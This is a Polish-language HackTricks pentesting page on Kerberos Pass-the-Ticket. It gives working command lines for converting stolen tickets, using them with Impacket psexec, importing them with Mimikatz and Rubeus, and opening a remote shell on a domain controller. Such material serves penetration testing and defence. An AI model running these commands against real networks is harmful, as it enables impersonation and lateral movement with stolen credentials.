# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Omówienie

W ataku Pass-the-Ticket (PtT) adversary wykorzystuje skradziony ticket Kerberos do uwierzytelnienia się jako principal przypisany do ticketu, bez posiadania hasła tego konta. Ticket-granting ticket (TGT) może służyć do żądania service tickets, natomiast skradziony service ticket jest ograniczony do docelowej usługi i okresu ważności.<sup>[[1]](#references)</sup>

Informacje o technikach pozyskiwania ticketów znajdziesz tutaj:

- [Pozyskiwanie ticketów z Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Pozyskiwanie ticketów z Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Konwertowanie formatów ticketów Linux i Windows

Cache Kerberos często występują w systemie Linux jako pliki MIT `ccache`, a w systemie Windows jako pliki `.kirbi`. `ticket_converter` konwertuje te formaty, wykorzystując ticket wejściowy i ścieżkę wyjściową.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo udostępnia również narzędzia do obsługi Kerberos ticket w systemie Windows.<sup>[[3]](#references)</sup>

## Używanie ticketu

W systemie Linux ustaw `KRB5CCNAME` na cache i poinstruuj klienta Impacket, aby używał Kerberos bez pytania o hasło:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
W systemie Windows Mimikatz lub Rubeus mogą zaimportować ticket `.kirbi` do bieżącej sesji logowania. Użyj `klist`, aby sprawdzić wynikającą z tego pamięć podręczną.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Import ticketu nie nadaje uprawnień wykraczających poza te reprezentowane przez ticket oraz politykę autoryzacji docelowej usługi. Wygasłe, unieważnione, nieprawidłowo sformatowane lub nieprawidłowo określone zakresowo tickety mogą nie zadziałać.<sup>[[1]](#references)</sup>

Aby uzyskać szerszy kontekst ataków Kerberos i powiązanych technik pozyskiwania ticketów, zobacz przewodnik Tarlogic dotyczący ataków Kerberos.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Przykłady Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Techniki ataków Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
